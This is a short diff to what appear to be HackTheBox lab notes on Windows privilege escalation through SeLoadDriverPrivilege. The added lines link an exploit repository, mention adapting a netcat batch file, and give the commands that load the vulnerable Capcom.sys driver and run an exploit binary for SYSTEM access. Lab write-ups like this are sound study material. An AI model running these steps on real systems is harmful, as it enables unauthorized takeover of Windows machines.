@@ -116,5 +116,7 @@ how to check?
 whoami /all #we have SeLoadDriverPrivilege permission
 
 exploit
+https://github.com/mach1el/htb-scripts/tree/master/exploit-fuse, modify netcat.bat and put all of them to c:\temp, then make it run
 
-
+.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys
+.\ExploitCapcom_modded.exe
